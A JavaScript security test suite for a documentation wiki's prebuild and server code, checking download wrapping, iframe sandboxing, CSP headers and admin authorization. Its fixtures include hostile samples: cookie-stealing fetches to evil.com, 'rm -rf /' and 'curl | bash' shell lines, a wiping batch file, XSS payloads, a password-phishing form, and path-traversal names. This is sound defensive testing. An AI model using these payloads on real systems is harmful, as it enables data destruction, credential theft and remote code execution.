import { describe, it, before, after } from 'node:test';
import assert from 'node:assert';
import fs from 'fs-extra';
import path from 'path';
import { runPrebuild } from '../scripts/prebuild.js';
import { PATHS } from '../config/constants.js';
import * as securityConfig from '../config/security.js';
import { requireAdmin } from '../server/middleware/requireAuth.js';

const TEST_SOURCE = path.join(process.cwd(), 'test-temp-security', 'source');
const TEST_DOCS = path.join(process.cwd(), 'test-temp-security', 'src', 'content', 'docs');
const TEST_DOWNLOADS = path.join(process.cwd(), 'test-temp-security', 'public', 'downloads');
const TEST_SIDEBAR = path.join(process.cwd(), 'test-temp-security', 'src', 'sidebar.json');
const TEST_CACHE = path.join(process.cwd(), 'test-temp-security', 'data', 'prebuild-cache.json');

const ORIGINAL_PATHS = { ...PATHS };

function invokeMiddleware(middleware, user) {
  const result = { statusCode: 200, body: null, nextCalled: false };
  const req = { user, isAuthenticated: () => true };
  const res = {
    status(code) {
      result.statusCode = code;
      return this;
    },
    json(body) {
      result.body = body;
      return this;
    },
  };
  middleware(req, res, () => { result.nextCalled = true; });
  return result;
}

before(() => {
  PATHS.SOURCE = TEST_SOURCE;
  PATHS.DOCS = TEST_DOCS;
  PATHS.DOWNLOADS = TEST_DOWNLOADS;
  PATHS.SIDEBAR_JSON = TEST_SIDEBAR;
  PATHS.PREBUILD_CACHE = TEST_CACHE;

  fs.ensureDirSync(TEST_SOURCE);
});

after(() => {
  Object.assign(PATHS, ORIGINAL_PATHS);
  fs.removeSync(path.join(process.cwd(), 'test-temp-security'));
});

describe('Security - Executable Files', () => {
  it('should handle JavaScript files by creating download wrapper', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const maliciousJs = 'alert(document.cookie); fetch("https://evil.com/steal?c=" + document.cookie);';
    fs.outputFileSync(path.join(TEST_SOURCE, 'malicious.js'), maliciousJs);

    runPrebuild();

    // Should create wrapper MD file
    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'malicious.md')));

    // JS file should be in downloads (downloadable but not executable in page context)
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'malicious.js')));

    // Check wrapper contains download link
    const wrapperContent = fs.readFileSync(path.join(TEST_DOCS, 'malicious.md'), 'utf-8');
    assert.ok(wrapperContent.includes('download'));
    assert.ok(wrapperContent.includes('/downloads/malicious.js'));

    // SECURITY CHECK: Should use download attribute, not direct execution
    assert.ok(wrapperContent.includes('download>'));
  });

  it('should handle shell scripts (.sh) as downloadable assets', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const maliciousShell = '#!/bin/bash\nrm -rf /\ncurl https://evil.com/payload | bash';
    fs.outputFileSync(path.join(TEST_SOURCE, 'evil.sh'), maliciousShell);

    runPrebuild();

    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'evil.md')));
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'evil.sh')));

    const wrapper = fs.readFileSync(path.join(TEST_DOCS, 'evil.md'), 'utf-8');
    assert.ok(wrapper.includes('download'));
  });

  it('should handle Windows executables (.exe, .bat)', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    fs.outputFileSync(path.join(TEST_SOURCE, 'malware.exe'), 'MZ\x90\x00'); // Fake PE header
    fs.outputFileSync(path.join(TEST_SOURCE, 'virus.bat'), '@echo off\ndel /f /s /q C:\\*');

    runPrebuild();

    // Both should be downloadable assets
    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'malware.md')));
    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'virus.md')));
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'malware.exe')));
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'virus.bat')));
  });
});

describe('Security - XSS in HTML', () => {
  it('should handle HTML with inline scripts (iframe isolation)', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const xssHtml = `<!DOCTYPE html>
<html>
<head><title>XSS Test</title></head>
<body>
  <h1>Hello</h1>
  <script>
    alert(document.cookie);
    fetch('https://evil.com/steal?c=' + document.cookie);
  </script>
</body>
</html>`;

    fs.outputFileSync(path.join(TEST_SOURCE, 'xss.html'), xssHtml);

    runPrebuild();

    // HTML should be copied to downloads
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'xss.html')));

    // Wrapper should contain iframe
    const wrapper = fs.readFileSync(path.join(TEST_DOCS, 'xss.md'), 'utf-8');
    assert.ok(wrapper.includes('iframe'));
    assert.ok(wrapper.includes('/downloads/xss.html'));
    assert.ok(wrapper.includes('sandbox="allow-scripts"'));
    assert.ok(!wrapper.includes('allow-same-origin'));
  });

  it('should handle HTML with event handlers', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const eventXss = '<div onclick="alert(1)" onload="fetch(\'evil.com\')">Click me</div>';
    fs.outputFileSync(path.join(TEST_SOURCE, 'event-xss.html'), eventXss);

    runPrebuild();

    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'event-xss.html')));
    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'event-xss.md')));
  });

  it('should handle HTML folder with malicious content', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const htmlFolder = path.join(TEST_SOURCE, 'evil-app');
    fs.outputFileSync(path.join(htmlFolder, 'index.html'), '<script>alert("XSS")</script>');
    fs.outputFileSync(path.join(htmlFolder, 'malicious.js'), 'steal_cookies()');

    runPrebuild();

    // Entire folder should be copied
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'evil-app', 'index.html')));
    assert.ok(fs.existsSync(path.join(TEST_DOWNLOADS, 'evil-app', 'malicious.js')));
  });
});

describe('Security - HTML Download Headers', () => {
  it('sandboxes HTML downloads without granting the wiki origin', () => {
    assert.equal(typeof securityConfig.setDownloadSecurityHeaders, 'function');
    const headers = {};
    const res = { setHeader: (name, value) => { headers[name] = value; } };

    securityConfig.setDownloadSecurityHeaders(res, '/tmp/example.html');

    assert.equal(headers['Content-Security-Policy'], 'sandbox allow-scripts');
  });

  it('does not add sandbox CSP to non-HTML downloads', () => {
    assert.equal(typeof securityConfig.setDownloadSecurityHeaders, 'function');
    const headers = {};
    const res = { setHeader: (name, value) => { headers[name] = value; } };

    securityConfig.setDownloadSecurityHeaders(res, '/tmp/report.pdf');

    assert.equal(headers['Content-Security-Policy'], undefined);
  });

  it('sandboxes SVG downloads without allowing scripts', () => {
    const headers = {};
    const res = { setHeader: (name, value) => { headers[name] = value; } };

    securityConfig.setDownloadSecurityHeaders(res, '/tmp/image.svg');

    assert.equal(headers['Content-Security-Policy'], 'sandbox');
    assert.equal(headers['X-Content-Type-Options'], 'nosniff');
  });

  it('registers downloads before extensionless redirects', () => {
    const serverSource = fs.readFileSync(path.join(process.cwd(), 'server', 'index.js'), 'utf-8');
    const downloadsRoute = serverSource.indexOf("app.use('/downloads'");
    const extensionRedirect = serverSource.indexOf('if (/\\.(html|md|mdx)$/i.test(req.path))');

    assert.ok(downloadsRoute >= 0, 'downloads route must exist');
    assert.ok(extensionRedirect >= 0, 'extension redirect must exist');
    assert.ok(downloadsRoute < extensionRedirect, 'downloads must be served before redirects');
  });
});

describe('Security - XSS in Markdown', () => {
  it('should preserve inline scripts in markdown (relies on Astro sanitization)', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const xssMd = `---
title: XSS Test
---

# Hello

<script>alert(document.cookie)</script>

<img src=x onerror="alert('XSS')">

<a href="javascript:alert('XSS')">Click</a>`;

    fs.outputFileSync(path.join(TEST_SOURCE, 'xss-md.md'), xssMd);

    runPrebuild();

    const processed = fs.readFileSync(path.join(TEST_DOCS, 'xss-md.md'), 'utf-8');

    // Scripts ARE preserved in markdown
    assert.ok(processed.includes('<script>'));
    assert.ok(processed.includes('onerror'));
    assert.ok(processed.includes('javascript:'));

    // NOTE: Astro/Starlight should sanitize these during rendering
    // but the source markdown contains them
  });

  it('should handle markdown with data URIs', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const dataUriMd = `# Test
![](data:text/html,<script>alert('XSS')</script>)
[Link](data:text/html,<script>alert('XSS')</script>)`;

    fs.outputFileSync(path.join(TEST_SOURCE, 'data-uri.md'), dataUriMd);

    runPrebuild();

    const processed = fs.readFileSync(path.join(TEST_DOCS, 'data-uri.md'), 'utf-8');
    assert.ok(processed.includes('data:text/html'));
  });

  it('should handle markdown with embedded HTML forms', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    const formMd = `# Form
<form action="https://evil.com/steal" method="POST">
  <input type="password" name="pwd">
  <button>Submit</button>
</form>`;

    fs.outputFileSync(path.join(TEST_SOURCE, 'form.md'), formMd);

    runPrebuild();

    const processed = fs.readFileSync(path.join(TEST_DOCS, 'form.md'), 'utf-8');
    assert.ok(processed.includes('<form'));
  });
});

describe('Security - Path Traversal', () => {
  it('should sanitize file paths with .. (directory traversal)', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    // Try to create file with path traversal
    const maliciousPath = path.join(TEST_SOURCE, '../../../etc/passwd.md');
    try {
      fs.outputFileSync(maliciousPath, '# Hacked');
      runPrebuild();

      // File should NOT be in DOCS root or parent directories
      assert.ok(!fs.existsSync(path.join(TEST_DOCS, '../../../etc/passwd.md')));
    } catch (err) {
      // Expected to fail
      assert.ok(true);
    }
  });

  it('should handle filenames with null bytes', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    // Null byte injection attempt (may not work on all filesystems)
    try {
      const nullByteName = 'evil\x00.md';
      fs.outputFileSync(path.join(TEST_SOURCE, nullByteName), '# Test');
      runPrebuild();
      // Should handle gracefully
      assert.ok(true);
    } catch (err) {
      // Expected on systems that don't allow null bytes
      assert.ok(true);
    }
  });
});

describe('Security - File Size Bombs', () => {
  it('should handle zip bombs or large files gracefully', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    // Create a large file (10MB)
    const largeMd = '# Large\n\n' + 'A'.repeat(10 * 1024 * 1024);
    fs.outputFileSync(path.join(TEST_SOURCE, 'bomb.md'), largeMd);

    // Should not crash
    assert.doesNotThrow(() => {
      runPrebuild();
    });

    assert.ok(fs.existsSync(path.join(TEST_DOCS, 'bomb.md')));
  });

  it('should handle deeply nested zip-like structures', () => {
    fs.emptyDirSync(TEST_SOURCE);
    fs.emptyDirSync(TEST_DOCS);

    // Create deeply nested directories (100 levels)
    let deepPath = TEST_SOURCE;
    for (let i = 0; i < 100; i++) {
      deepPath = path.join(deepPath, `level${i}`);
    }

    try {
      fs.ensureDirSync(deepPath);
      fs.outputFileSync(path.join(deepPath, 'deep.md'), '# Deep');

      runPrebuild();

      // Should handle without stack overflow
      assert.ok(true);
    } catch (err) {
      // May fail due to path length limits on some systems
      assert.ok(true);
    }
  });
});

describe('Security - Content Security Policy', () => {
  it('should check if CSP headers can be added (recommendation)', () => {
    // This is a recommendation test, not a functional test
    // CSP should be configured at server level

    const recommendations = [
      "Add Content-Security-Policy header to prevent inline scripts",
      "Use 'sandbox' attribute on iframes for HTML content",
      "Implement file type whitelist/blacklist for uploads",
      "Add virus scanning for uploaded files",
      "Implement rate limiting for file uploads",
    ];

    console.log('\n⚠️  SECURITY RECOMMENDATIONS:');
    recommendations.forEach((rec, i) => {
      console.log(`${i + 1}. ${rec}`);
    });

    assert.ok(true);
  });
});

describe('Security - Authorization Boundaries', () => {
  it('should reject pending administrators from admin APIs', () => {
    const result = invokeMiddleware(requireAdmin, { role: 'admin', status: 'pending' });

    assert.equal(result.statusCode, 403);
    assert.deepEqual(result.body, { error: 'Account pending approval' });
    assert.equal(result.nextCalled, false);
  });

  it('should reject blocked administrators from admin APIs', () => {
    const result = invokeMiddleware(requireAdmin, { role: 'admin', status: 'blocked' });

    assert.equal(result.statusCode, 403);
    assert.deepEqual(result.body, { error: 'Account blocked' });
    assert.equal(result.nextCalled, false);
  });

  it('should require authentication for the Pagefind search index', () => {
    const serverSource = fs.readFileSync(path.join(process.cwd(), 'server', 'index.js'), 'utf-8');

    assert.match(
      serverSource,
      /app\.use\('\/pagefind',\s*requireAuth,\s*express\.static\(/,
    );
  });
});
